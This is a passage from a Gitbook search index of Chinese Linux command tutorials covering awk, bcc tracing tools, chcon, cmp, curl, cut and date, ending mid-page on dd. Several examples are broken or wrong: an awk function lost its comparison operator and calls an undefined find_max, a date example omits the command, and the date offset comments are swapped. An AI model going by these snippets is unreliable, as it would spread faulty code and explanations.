279 Bob 2415 40 57 62 159 --------------------------------------------- TOTAL: 319 393 350 AVERAGE: 63.80 78.60 70.00 5. 自定义函数 用户自定义函数的语法格式为： function function_name(argument1, argument2, ...) { function body } function_name 是用户自定义函数的名称。函数名称应该以字母开头，其后可以是数字、字母或下划线的自由组合。AWK 保留的关键字不能作为用户自定义函数的名称。 自定义函数可以接受多个输入参数，这些参数之间通过逗号分隔。参数并不是必须的。我们也可以定义没有任何输入参数的函数。 function body 是函数体部分，它包含 AWK 程序代码。 求最大值与最小值 # 返回最小值 function find_min(num1, num2) { if (num1 num2) return num1 return num2 } # 主函数 function main(num1, num2) { # 查找最小值 result = find_min(10, 20) print \"Minimum =\", result # 查找最大值 result = find_max(10, 20) print \"Maximum =\", result } # 脚本从这里开始执行 BEGIN { main(10, 20) } 执行 functions.awk 文件，可以得到如下的结果： $ awk -f functions.awk Minimum = 10 Maximum = 20 6. 数组 AWK 可以使用关联数组这种数据结构，索引可以是数字或字符串。 AWK关联数 组也不需要提前声明其大小，因为它在运行时可以自动的增大或减小。 数组使用的语法格式： array_name[index]=value array_name：数组的名称 index：数组索引 value：数组中元素所赋予的值6.1 创建数组 接下来看一下如何创建数组以及如何访问数组元素： $ awk 'BEGIN { sites[\"runoob\"]=\"www.runoob.com\"; sites[\"google\"]=\"www.google.com\" print sites[\"runoob\"] \"\\n\" sites[\"google\"] }' 执行以上命令，输出结果为： www.runoob.com www.google.com 6.2 删除数组元素 我们可以使用 delete 语句来删除数组元素，语法格式如下： delete array_name[index 下面的例子中，数组中的 google 元素被删除（删除命令没有输出）： $ awk 'BEGIN { sites[\"runoob\"]=\"www.runoob.com\"; sites[\"google\"]=\"www.google.com\" delete sites[\"google\"]; print fruits[\"google\"] }' 输出为空。 6.3 多维数组 下面是模拟二维数组的例子： $ awk 'BEGIN { array[\"0,0\"] = 100; array[\"0,1\"] = 200; array[\"0,2\"] = 300; array[\"1,0\"] = 400; array[\"1,1\"] = 500; array[\"1,2\"] = 600; # 输出数组元素 print \"array[0,0] = \" array[\"0,0\"]; print \"array[0,1] = \" array[\"0,1\"]; print \"array[0,2] = \" array[\"0,2\"]; print \"array[1,0] = \" array[\"1,0\"]; print \"array[1,1] = \" array[\"1,1\"]; print \"array[1,2] = \" array[\"1,2\"]; }' 执行上面的命令可以得到如下结果： array[0,0] = 100 array[0,1] = 200 array[0,2] = 300 array[1,0] = 400 array[1,1] = 500 array[1,2] = 600 7. split 切割 $ ip=$(kubectl get pod www -o yaml |grep podIP | awk '{split($0,a,\":\"); print a[2]}'); echo $ip 10.32.0.6 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:31:06 "},"Linux-Command/Linux_Command_bcc.html":{"url":"Linux-Command/Linux_Command_bcc.html","title":"Linux Command Bcc","keywords":"","body":"Linux Command BCC 性能监视、网络动态跟踪工具1. ubuntu安装2. centos安装3. cachestat 缓存统计4. cachetop 缓存命中5. filtop 跟踪内核中文件的读写6. opensnoop 跟踪内核中 open 系统调用Linux Command BCC 性能监视、网络动态跟踪工具 tagsstart 监控 分析 tagsstop 1. ubuntu安装 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 4052245BD4284CDD echo \"deb https://repo.iovisor.org/apt/xenial xenial main\" | sudo tee /etc/apt/sources.list.d/iovisor.list sudo apt-get update sudo apt-get install -y bcc-tools libbcc-examples linux-headers-$(uname -r) 操作完这些步骤，bcc 提供的所有工具就都安装到 /usr/share/bcc/tools 这个目录中了。不过这里提醒你，bcc 软件包默认不会把这些工具配置到系统的 PATH 路径中，所以你得自己手动配置： $ export PATH=$PATH:/usr/share/bcc/tools 2. centos安装 第一步，升级内核。你可以运行下面的命令来操作： # 升级系统 yum update -y # 安装ELRepo rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org rpm -Uvh https://www.elrepo.org/elrepo-release-7.0-3.el7.elrepo.noarch.rpm # 安装新内核 yum remove -y kernel-headers kernel-tools kernel-tools-libs yum --enablerepo=\"elrepo-kernel\" install -y kernel-ml kernel-ml-devel kernel-ml-headers kernel-ml-tools kernel-ml-tools-libs kernel-ml-tools-libs-devel # 更新Grub后重启 grub2-mkconfig -o /boot/grub2/grub.cfg grub2-set-default 0 reboot # 重启后确认内核版本已升级为4.20.0-1.el7.elrepo.x86_64 uname -r 第二步，安装 bcc-tools： # 安装bcc-tools yum install -y bcc-tools # 配置PATH路径 export PATH=$PATH:/usr/share/bcc/tools # 验证安装成功 cachestat 3. cachestat 缓存统计 $ cachestat 1 3 TOTAL MISSES HITS DIRTIES BUFFERS_MB CACHED_MB 2 0 2 1 17 279 2 0 2 1 17 279 2 0 2 1 17 279 你可以看到，cachestat 的输出其实是一个表格。每行代表一组数据，而每一列代表不同的缓存统计指标。这些指标从左到右依次表示： TOTAL ，表示总的 I/O 次数； MISSES ，表示缓存未命中的次数； HITS ，表示缓存命中的次数； DIRTIES， 表示新增到缓存中的脏页数； BUFFERS_MB 表示 Buffers 的大小，以 MB 为单位； CACHED_MB 表示 Cache 的大小，以 MB 为单位。 4. cachetop 缓存命中 $ cachetop 11:58:50 Buffers MB: 258 / Cached MB: 347 / Sort: HITS / Order: ascending PID UID CMD HITS MISSES DIRTIES READ_HIT% WRITE_HIT% 13029 root python 1 0 0 100.0% 0.0% 它的输出跟 top 类似，默认按照缓存的命中次数（HITS）排序，展示了每个进程的缓存命中情况。具体到每一个指标，这里的 HITS、MISSES 和 DIRTIES ，跟 cachestat 里的含义一样，分别代表间隔时间内的缓存命中次数、未命中次数以及新增到缓存中的脏页数。而 READ_HIT 和 WRITE_HIT ，分别表示读和写的缓存命中率。 5. filtop 跟踪内核中文件的读写 filetop。它是 bcc 软件包的一部分，基于 Linux 内核的 eBPF（extended Berkeley Packet Filters）机制，主要跟踪内核中文件的读写情况，并输出线程 ID（TID）、读写大小、读写类型以及文件名称。 bcc 提供的所有工具，全部安装到了 /usr/share/bcc/tools 这个目录中。接下来我们就用这个工具，观察一下文件的读写情况。首先，在终端一中运行下面的命令： # 切换到工具目录 $ cd /usr/share/bcc/tools # -C 选项表示输出新内容时不清空屏幕 $ ./filetop -C TID COMM READS WRITES R_Kb W_Kb T FILE 514 python 0 1 0 2832 R 669.txt 514 python 0 1 0 2490 R 667.txt 514 python 0 1 0 2685 R 671.txt 514 python 0 1 0 2392 R 670.txt 514 python 0 1 0 2050 R 672.txt ... TID COMM READS WRITES R_Kb W_Kb T FILE 514 python 2 0 5957 0 R 651.txt 514 python 2 0 5371 0 R 112.txt 514 python 2 0 4785 0 R 861.txt 514 python 2 0 4736 0 R 213.txt 514 python 2 0 4443 0 R 45.txt 你会看到，filetop 输出了 8 列内容，分别是线程 ID、线程命令行、读写次数、读写的大小（单位 KB）、文件类型以及读写的文件名称。 这些内容里，你可能会看到很多动态链接库，不过这不是我们的重点，暂且忽略即可。我们的重点，是一个 python 应用，所以要特别关注 python 相关的内容。多观察一会儿，你就会发现，每隔一段时间，线程号为 514 的 python 应用就会先写入大量的 txt 文件，再大量地读。 线程号为 514 的线程，属于哪个进程呢？我们可以用 ps 命令查看。先在终端一中，按下 Ctrl+C ，停止 filetop ；然后，运行下面的 ps 命令。这个输出的第二列内容，就是我们想知道的进程号： $ ps -efT | grep 514 root 12280 514 14626 33 14:47 pts/0 00:00:05 /usr/local/bin/python /app.py 6. opensnoop 跟踪内核中 open 系统调用 opensnoop 。它同属于 bcc 软件包，可以动态跟踪内核中的 open 系统调用。这样，我们就可以找出这些 txt 文件的路径。接下来，在终端一中，运行下面的 opensnoop 命令： $ opensnoop 12280 python 6 0 /tmp/9046db9e-fe25-11e8-b13f-0242ac110002/650.txt 12280 python 6 0 /tmp/9046db9e-fe25-11e8-b13f-0242ac110002/651.txt 12280 python 6 0 /tmp/9046db9e-fe25-11e8-b13f-0242ac110002/652.txt 这次，通过 opensnoop 的输出，你可以看到，这些 txt 路径位于 /tmp 目录下。你还能看到，它打开的文件数量，按照数字编号，从 0.txt 依次增大到 999.txt，这可远多于前面用 filetop 看到的数量。 参考： BCC 用于Linux性能监视，网络和更多的动态跟踪工具 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:01:24 "},"Linux-Command/Linux_Command_chcon.html":{"url":"Linux-Command/Linux_Command_chcon.html","title":"Linux Command Chcon","keywords":"","body":"Linux command chcon 修改文件安全上下文1. 简介2. 语法3. 选项4. 实例Linux command chcon 修改文件安全上下文 tagsstart 文件管理 tagsstop 1. 简介 chcon命令是修改对象（文件）的安全上下文，比如：用户、角色、类型、安全级别。也就是将每个文件的安全环境变更至指定环境。使用--reference选项时，把指定文件的安全环境设置为与参考文件相同。chcon命令位于/usr/bin/chcon。 2. 语法 chcon [选项]... 环境 文件... chcon [选项]... [-u 用户] [-r 角色] [-l 范围] [-t 类型] 文件... chcon [选项]... --reference=参考文件 文件... 3. 选项 -h, --no-dereference：影响符号连接而非引用的文件。 --reference=参考文件：使用指定参考文件的安全环境，而非指定值。 -R, --recursive：递归处理所有的文件及子目录。 -v, --verbose：为处理的所有文件显示诊断信息。 -u, --user=用户：设置指定用户的目标安全环境。 -r, --role=角色：设置指定角色的目标安全环境。 -t, --type=类型：设置指定类型的目标安全环境。 -l, --range=范围：设置指定范围的目标安全环境。 以下选项是在指定了-R选项时被用于设置如何穿越目录结构体系。如果您指定了多于一个选项，那么只有最后一个会生效。 -H：如果命令行参数是一个通到目录的符号链接，则遍历符号链接。 -L：遍历每一个遇到的通到目录的符号链接。 -P：不遍历任何符号链接（默认）。 --help：显示此帮助信息并退出。 --version：显示版本信息并退出。 4. 实例 如果你想把这个ftp共享给匿名用户的话，需要开启以下： chcon -R -t public_content_t /var/ftp 如果你想让你设置的FTP目录可以上传文件的话，SELINUX需要设置： chcon -t public_content_rw_t /var/ftp/incoming 允许用户HHTP访问其家目录，该设定限仅于用户的家目录主页： setsebool -P httpd_enable_homedirs 1 chcon -R -t httpd_sys_content_t ~user/public_html 如果你希望将samba目录共享给其他用户，你需要设置： chcon -t samba_share_t /directory 共享rsync目录时： chcon -t public_content_t /directories Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 16:40:35 "},"Linux-Command/Linux_Command_cmp.html":{"url":"Linux-Command/Linux_Command_cmp.html","title":"Linux Command Cmp","keywords":"","body":"Linux Command cmp 文件比较1. 简介2. 选项3. 举例Linux Command cmp 文件比较 tagsstart 文件管理 tagsstop 1. 简介 cmp命令 用来比较两个文件是否有差异。 当相互比较的两个文件完全一样时，则该指令不会显示任何信息。 若发现有差异，预设会标示出第一个不通之处的字符和列数编号。 若不指定任何文件名称或是所给予的文件名为“-”，则cmp指令会从标准输入设备读取数据。 2. 选项 -c 或--print-chars：除了标明差异处的十进制字码之外，一并显示该字符所对应字符； -i 或--ignore-initial=：指定一个数目； -l 或——verbose：标示出所有不一样的地方； -s 或--quiet或——silent：不显示错误信息； -v 或——version：显示版本信息； --help：在线帮助。 3. 举例 $ cat test1 111 aaa $ cat test2 111 222 aaa bbb $ cmp test1 test2 test1 test2 differ: byte 5, line 2 # 有差异：第5字节，第2行 $ cmp -i 1 test1 test2 test1 test2 differ: byte 4, line 2 $ cmp -l test1 test2 #标示出所有不一样的地方 5 141 62 6 141 62 7 141 62 cmp: EOF on test1 $ cmp -c test1 test2 #除了标明差异处的十进制字码之外，一并显示该字符所对应字符 test1 test2 differ: byte 5, line 2 is 141 a 62 2 $ cmp -s test1 test2 #如果文件相同，返回值0，如果不同，返回值1；如果发生错误，返回值2 $ echo $? 1 更多阅读： cmp Command in Linux with examples Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:31:21 "},"Linux-Command/Linux_Command_curl.html":{"url":"Linux-Command/Linux_Command_curl.html","title":"Linux Command Curl","keywords":"","body":"linux Command curl1. 参数1.1 -A1.2 -b1.3 -c1.4 -d或者1.5 -e1.6 -F1.7 -G1.8 -H1.9 -i1.10 -I1.11 -k1.12 -L1.13 --limit-rate1.14 -o1.15 -O1.16 -s1.17 -S1.18 -u1.19 -v1.20 -x1.21 -X2. 返回码linux Command curl tagsstart 网络 tagsstop 1. 参数 不带有任何参数时，curl 就是发出 GET 请求。 $ curl https://www.example.com 上面命令向www.example.com发出 GET 请求，服务器返回的内容会在命令行输出。 1.1 -A -A参数指定客户端的用户代理标头，即User-Agent。curl 的默认用户代理字符串是curl/[version]。 $ curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com 上面命令将User-Agent改成 Chrome 浏览器。 $ curl -A '' https://google.com 上面命令会移除User-Agent标头。 也可以通过-H参数直接指定标头，更改User-Agent。 $ curl -H 'User-Agent: php/1.0' https://google.com 1.2 -b -b参数用来向服务器发送 Cookie。 $ curl -b 'foo=bar' https://google.com 上面命令会生成一个标头Cookie: foo=bar，向服务器发送一个名为foo、值为bar的 Cookie。 $ curl -b 'foo1=bar' -b 'foo2=baz' https://google.com 上面命令发送两个 Cookie。 $ curl -b cookies.txt https://www.google.com 上面命令读取本地文件cookies.txt，里面是服务器设置的 Cookie（参见-c参数），将其发送到服务器。 1.3 -c -c参数将服务器设置的 Cookie 写入一个文件。 $ curl -c cookies.txt https://www.google.com 上面命令将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt。 1.4 -d -d参数用于发送 POST 请求的数据体。 $ curl -d'login=emma＆password=123'-X POST https://google.com/login $ curl http://127.0.0.1:8080/check_your_status?user=Summer&passwd=12345678 或者 $ curl -d 'login=emma' -d 'password=123' -X POST https://google.com/login 使用-d参数以后，HTTP 请求会自动加上标头Content-Type : application/x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。 -d参数可以读取本地文本文件的数据，向服务器发送。 $ curl -d '@data.txt' https://google.com/login 上面命令读取data.txt文件的内容，作为数据体向服务器发送。 --data-urlencode --data-urlencode参数等同于-d，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。 $ curl --data-urlencode 'comment=hello world' https://google.com/login 上面代码中，发送的数据hello world之间有一个空格，需要进行 URL 编码。 Curl命令提供了若干个设置HTTP POST数据的选项，这里比较如下： -d,--data 将HTTP POST请求中的数据发送给HTTP服务器，与用户提交HTML表单时浏览器的行为完全一样。 默认Content-type为application/x-www-form-urlencoded @file_name,表示数据来自一个文件，文件中的回车符和换行符将被转换 -,表示数据来自stdin，即标准输入设备 --data-ascii 等价于-d --data-binary HTTP POST请求中的数据为纯二进制数据 如果是@file_name,则保留文件中的回车符和换行符，不做任何转换 --data-raw 不处理@字符，即@not_as_a_file_name 其他等价于-d --data-urlencode 先对数据进行URL编码，再发送给HTTP服务器，即对表单中的字段值进行URL编码然后再发送。 为了兼容CGI，格式为name=content： name=content,将content进行URL编码，然后发送给HTTP服务器 =content,同上 content,同上，但是content中不能包含=，@符号 name@filename,从文件中读取数据（包括换行符），将读取的数据进行URL编码，然后发送给HTTP服务器 @filename,同上 其他等价于-d 1.5 -e -e参数用来设置 HTTP 的标头Referer，表示请求的来源。 curl -e 'https://google.com?q=example' https://www.example.com 上面命令将Referer标头设为https://google.com?q=example。 -H参数可以通过直接添加标头Referer，达到同样效果。 curl -H 'Referer: https://google.com?q=example' https://www.example.com 1.6 -F -F参数用来向服务器上传二进制文件。 $ curl -F 'file=@photo.png' https://google.com/profile 上面命令会给 HTTP 请求加上标头Content-Type: multipart/form-data，然后将文件photo.png作为file字段上传。 -F参数可以指定 MIME 类型。 $ curl -F 'file=@photo.png;type=image/png' https://google.com/profile 上面命令指定 MIME 类型为image/png，否则 curl 会把 MIME 类型设为application/octet-stream。 -F参数也可以指定文件名。 $ curl -F 'file=@photo.png;filename=me.png' https://google.com/profile 上面命令中，原始文件名为photo.png，但是服务器接收到的文件名为me.png。 1.7 -G -G参数用来构造 URL 的查询字符串。 $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search 上面命令会发出一个 GET 请求，实际请求的 URL 为https://google.com/search?q=kitties&count=20。如果省略--G，会发出一个 POST 请求。 如果数据需要 URL 编码，可以结合--data--urlencode参数。 $ curl -G --data-urlencode 'comment=hello world' https://www.example.com 1.8 -H -H参数添加 HTTP 请求的标头。 $ curl -H 'Accept-Language: en-US' https://google.com 上面命令添加 HTTP 标头Accept-Language: en-US。 $ curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com 上面命令添加两个 HTTP 标头。 $ curl -d '{\"login\": \"emma\", \"pass\": \"123\"}' -H 'Content-Type: application/json' https://google.com/login curl -H \"Content-Type:application/json\" -X POST --data '{\"message\": \"sunshine\"}' http://localhost:8000/ 上面命令添加 HTTP 请求的标头是Content-Type: application/json，然后用-d参数发送 JSON 数据。 1.9 -i -i参数打印出服务器回应的 HTTP 标头。 $ curl -i https://www.example.com 上面命令收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码。 1.10 -I -I参数向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。 $ curl -I https://www.example.com 上面命令输出服务器对 HEAD 请求的回应。 --head参数等同于-I。 $ curl --head https://www.example.com 1.11 -k -k参数指定跳过 SSL 检测。 $ curl -k https://www.example.com 上面命令不会检查服务器的 SSL 证书是否正确。 1.12 -L -L参数会让 HTTP 请求跟随服务器的重定向。curl 默认不跟随重定向。 $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet 1.13 --limit-rate --limit-rate用来限制 HTTP 请求和回应的带宽，模拟慢网速的环境。 $ curl --limit-rate 200k https://google.com 上面命令将带宽限制在每秒 200K 字节。 1.14 -o -o参数将服务器的回应保存成文件，等同于wget命令。 $ curl -o example.html https://www.example.com 上面命令将www.example.com保存成example.html。 1.15 -O -O参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。 $ curl -O https://www.example.com/foo/bar.html 上面命令将服务器回应保存成文件，文件名为bar.html。 1.16 -s -s参数将不输出错误和进度信息。 $ curl -s https://www.example.com 上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。 如果想让 curl 不产生任何输出，可以使用下面的命令。 $ curl -s -o /dev/null https://google.com 1.17 -S -S参数指定只输出错误信息，通常与-o一起使用。 $ curl -s -o /dev/null https://google.com 上面命令没有任何输出，除非发生错误。 1.18 -u -u参数用来设置服务器认证的用户名和密码。 $ curl -u 'bob:12345' https://google.com/login 上面命令设置用户名为bob，密码为12345，然后将其转为 HTTP 标头Authorization: Basic Ym9iOjEyMzQ1。 curl 能够识别 URL 里面的用户名和密码。 $ curl https://bob:12345@google.com/login 上面命令能够识别 URL 里面的用户名和密码，将其转为上个例子里面的 HTTP 标头。 $ curl -u 'bob' https://google.com/login 上面命令只设置了用户名，执行后，curl 会提示用户输入密码。 1.19 -v -v参数输出通信的整个过程，用于调试。 $ curl -v https://www.example.com --trace参数也可以用于调试，还会输出原始的二进制数据。 $ curl --trace - https://www.example.com 1.20 -x -x参数指定 HTTP 请求的代理。 $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com 上面命令指定 HTTP 请求通过myproxy.com:8080的 socks5 代理发出。 如果没有指定代理协议，默认为 HTTP。 $ curl -x james:cats@myproxy.com:8080 https://www.example.com 上面命令中，请求的代理使用 HTTP 协议。 1.21 -X -X参数指定 HTTP 请求的方法。 $ curl -X POST https://www.example.com 上面命令对https://www.example.com发出 POST 请求。 2. 返回码 shell命令：curl -I -m 10 -o /dev/null -s -w %{http_code} http://test.com curl_init — 初始化一个curl会话 curl_copy_handle — 拷贝一个curl连接资源的所有内容和参数 curl_errno — 返回一个包含当前会话错误信息的数字编号 curl_error — 返回一个包含当前会话错误信息的字符串 curl_exec — 执行一个curl会话 curl_getinfo — 获取一个curl连接资源句柄的信息 curl_multi_init — 初始化一个curl批处理句柄资源 curl_multi_add_handle — 向curl批处理会话中添加单独的curl句柄资源 curl_multi_close — 关闭一个批处理句柄资源 curl_multi_exec — 解析一个curl批处理句柄 curl_multi_getcontent — 返回获取的输出的文本流 curl_multi_info_read — 获取当前解析的curl的相关传输信息 curl_multi_remove_handle — 移除curl批处理句柄资源中的某个句柄资源 curl_multi_select — Get all the sockets associated with the cURL extension, which can then be \"selected\" curl_setopt_array — 以数组的形式为一个curl设置会话参数 curl_setopt — 为一个curl设置会话参数 curl_version — 获取curl相关的版本信息 curl_close — 关闭一个curl会话 curl爬取过程中，会返回一个http_code，下面是他们的意义信息 $http_code[\"0\"]=\"Unable to access\"; $http_code[\"100\"]=\"Continue\"; $http_code[\"101\"]=\"Switching Protocols\"; $http_code[\"200\"]=”OK”; $http_code[\"201\"]=”Created”; $http_code[\"202\"]=”Accepted”; $http_code[\"203\"]=”Non-Authoritative Information”; $http_code[\"204\"]=”No Content”; $http_code[\"205\"]=”Reset Content”; $http_code[\"206\"]=”Partial Content”; $http_code[\"300\"]=”Multiple Choices”; $http_code[\"301\"]=”Moved Permanently”; $http_code[\"302\"]=”Found”; $http_code[\"303\"]=”See Other”; $http_code[\"304\"]=”Not Modified”; $http_code[\"305\"]=”Use Proxy”; $http_code[\"306\"]=”(Unused)”; $http_code[\"307\"]=”Temporary Redirect”; $http_code[\"400\"]=”Bad Request”; $http_code[\"401\"]=”Unauthorized”; $http_code[\"402\"]=”Payment Required”; $http_code[\"403\"]=”Forbidden”; $http_code[\"404\"]=”Not Found”; $http_code[\"405\"]=”Method Not Allowed”; $http_code[\"406\"]=”Not Acceptable”; $http_code[\"407\"]=”Proxy Authentication Required”; $http_code[\"408\"]=”Request Timeout”; $http_code[\"409\"]=”Conflict”; $http_code[\"410\"]=”Gone”; $http_code[\"411\"]=”Length Required”; $http_code[\"412\"]=”Precondition Failed”; $http_code[\"413\"]=”Request Entity Too Large”; $http_code[\"414\"]=”Request-URI Too Long”; $http_code[\"415\"]=”Unsupported Media Type”; $http_code[\"416\"]=”Requested Range Not Satisfiable”; $http_code[\"417\"]=”Expectation Failed”; $http_code[\"500\"]=”Internal Server Error”; $http_code[\"501\"]=”Not Implemented”; $http_code[\"502\"]=”Bad Gateway”; $http_code[\"503\"]=”Service Unavailable”; $http_code[\"504\"]=”Gateway Timeout”; $http_code[\"505\"]=”HTTP Version Not Supported”; # -w表示只输出HTTP状态码及总时间，-o表示将响应重定向到/dev/null $ curl -s -w 'Http code: %{http_code}\\nTotal time:%{time_total}s\\n' -o /dev/null http://192.168.0.30/ ... Http code: 200 Total time:0.002s # --connect-timeout表示连接超时时间 $ curl -w 'Http code: %{http_code}\\nTotal time:%{time_total}s\\n' -o /dev/null --connect-timeout 10 http://192.168.0.30 ... Http code: 000 Total time:10.001s curl: (28) Connection timed out after 10000 milliseconds 参考： jiapeng curl command in Linux with Examples Linux curl命令详解 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 14:50:15 "},"Linux-Command/Linux_Command_cut.html":{"url":"Linux-Command/Linux_Command_cut.html","title":"Linux Command Cut","keywords":"","body":"Linux Command cut 切割1. 简介2. 参数3. 实例3.1 以“字节”定位3.2 给个以字符为定位3.3 以域为标志3.4 比较一列数字的大小Linux Command cut 切割 tagsstart 文件管理 tagsstop 图 1.2.10.1：在这里插入图片描述 1. 简介 cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。 如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。 2. 参数 -b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。 -c ：以字符为单位进行分割。 -d ：自定义分隔符，默认为制表符。 -f ：与-d一起使用，指定显示哪个区域。 -n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的 范围之内，该字符将被写出；否则，该字符将被排除 第一，字节（bytes），用选项-b 第二，字符（characters），用选项-c 第三，域（fields），用选项-f 3. 实例 3.1 以“字节”定位 $ who rocrocket :0 2009-01-08 11:07 rocrocket pts/0 2009-01-08 11:23 (:0.0) rocrocket pts/1 2009-01-08 14:15 (:0.0) 如果我们想提取每一行的第3个字节，就这样： $ who|cut -b 3 c c c 如果“字节”定位中，我想提取第3，第4、第5和第8个字节，怎么办? -b支持形如3-5的写法，而且多个定位之间用逗号隔开就成了。看看例子吧： $ who|cut -b 3-5,8 croe croe croe 3.2 给个以字符为定位 $ cat cut_ch.txt 星期一 星期二 星期三 星期四 $ cut -c 3 cut_ch.txt 一 二 三 四 3.3 以域为标志 $ cat /etc/passwd|head -n 5 root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin $ cat /etc/passwd|head -n 5|cut -d : -f 1 root bin daemon adm lp $ cat /etc/passwd|head -n 5|cut -d : -f 1,3-5 root:0:0:root bin:1:1:bin daemon:2:2:daemon adm:3:4:adm lp:4:7:lp 3.4 比较一列数字的大小 cat test | cut -d \" \" -f 1 | sort -n | head 更多阅读： Cut Command in Linux cut command in Linux with examples Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:37:00 "},"Linux-Command/Linux_Command_Date.html":{"url":"Linux-Command/Linux_Command_Date.html","title":"Linux Command Date","keywords":"","body":"Linux Command date 显示时间1. 简介2. 参数3. 日期格式4. 实例Linux Command date 显示时间 tagsstart 系统设置 tagsstop 1. 简介 命令功能：date 可以用来显示或设定系统的日期与时间。 2. 参数 -d：显示字符串所指的日期与时间。字符串前后必须加上双引号； -s：根据字符串来设置日期与时间。字符串前后必须加上双引号； -u：显示GMT； --help：在线帮助； --version：显示版本信息。 3. 日期格式 如果需要以指定的格式显示日期，可以使用“+”开头的字符串指定其格式 %H 小时(以00-23来表示)。 %I 小时(以01-12来表示)。 %K 小时(以0-23来表示)。 %l 小时(以0-12来表示)。 %M 分钟(以00-59来表示)。 %P AM或PM。 %r 时间(含时分秒，小时以12小时AM/PM来表示)。 %s 总秒数。起算时间为1970-01-01 00:00:00 UTC。 %S 秒(以本地的惯用法来表示)。 %T 时间(含时分秒，小时以24小时制来表示)。 %X 时间(以本地的惯用法来表示)。 %Z 市区。 %a 星期的缩写。 %A 星期的完整名称。 %b 月份英文名的缩写。 %B 月份的完整英文名称。 %c 日期与时间。只输入date指令也会显示同样的结果。 %d 日期(以01-31来表示)。 %D 日期(含年月日)。 %j 该年中的第几天。 %m 月份(以01-12来表示)。 %U 该年中的周数。 %w 该周的天数，0代表周日，1代表周一，异词类推。 %x 日期(以本地的惯用法来表示)。 %y 年份(以00-99来表示)。 %Y 年份(以四位数来表示)。 %n 在显示时，插入新的一行。 %t 在显示时，插入tab。 MM 月份(必要) DD 日期(必要) hh 小时(必要) mm 分钟(必要) ss 秒(选择性) 4. 实例 格式化输出： $ date +\"%Y-%m-%d\" 2015-12-07 输出昨天日期： $ date -d \"1 day ago\" +\"%Y-%m-%d\" 2015-11-19 2秒后输出： $ -d \"2 second\" +\"%Y-%m-%d %H:%M.%S\" 2015-11-20 14:21.31 传说中的 1234567890 秒： $ date -d \"1970-01-01 1234567890 seconds\" +\"%Y-%m-%d %H:%m:%S\" 2009-02-13 23:02:30 普通转格式： $ date -d \"2009-12-12\" +\"%Y/%m/%d %H:%M.%S\" 2009/12/12 00:00.00 apache格式转换： $ date -d \"Dec 5, 2009 12:00:37 AM\" +\"%Y-%m-%d %H:%M.%S\" 2009-12-05 00:00.37 格式转换后时间： $ date -d \"Dec 5, 2009 12:00:37 AM 2 year ago\" +\"%Y-%m-%d %H:%M.%S\" 2007-12-05 00:00.37 加减操作： $ date +%Y%m%d #显示前天年月日 $ date -d \"+1 day\" +%Y%m%d #显示前一天的日期 $ date -d \"-1 day\" +%Y%m%d #显示后一天的日期 $ date -d \"-1 month\" +%Y%m%d #显示上一月的日期 $ date -d \"+1 month\" +%Y%m%d #显示下一月的日期 $ date -d \"-1 year\" +%Y%m%d #显示前一年的日期 $ date -d \"+1 year\" +%Y%m%d #显示下一年的日期 设定时间： $ date -s #设置当前时间，只有root权限才能设置，其他只能查看 $ date -s 20120523 #设置成20120523，这样会把具体时间设置成空00:00:00 $ date -s 01:01:01 #设置具体时间，不会对日期做更改 $ date -s \"01:01:01 2012-05-23\" #这样可以设置全部时间 $ date -s \"01:01:01 20120523\" #这样可以设置全部时间 $ date -s \"2012-05-23 01:01:01\" #这样可以设置全部时间 $ date -s \"20120523 01:01:01\" #这样可以设置全部时间 检查一组命令花费的时间： #!/bin/bash start=$(date +%s) nmap man.linuxde.net &> /dev/null end=$(date +%s) difference=$(( end - start )) echo $difference seconds. 字符串格式时间戳 $ date +%s 1436781527 $ date -d '06/12/2018 07:21:22' +\"%s\" 1528759282 $ date -d '2018-06-12 07:21:22' +\"%s\" 1528759282 $ date -d \"04 June 1989\" 1989年 06月 04日 星期日 00:00:00 CDT $ date -j -f \"%Y-%m-%d %H:%M:%S\" \"2015-07-13 18:02:00\" \"+%s\" 1436781720 时间戳 转为时间 $ date -d @1436781720 2015年 07月 13日 星期一 18:02:00 CST 图 1.2.11.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:41:16 "},"Linux-Command/Linux_Command_dd.html":{"url":"Linux-Command/Linux_Command_dd.html","title":"Linux Command Dd","keywords":"","body":"Linux Command dd1. 简介2. 参数3. 举例3.1 /dev/hdb备份至/dev/hdd3.2 备份文件恢复至指定盘3.3 备份/dev/hdb并gzip压缩3.4 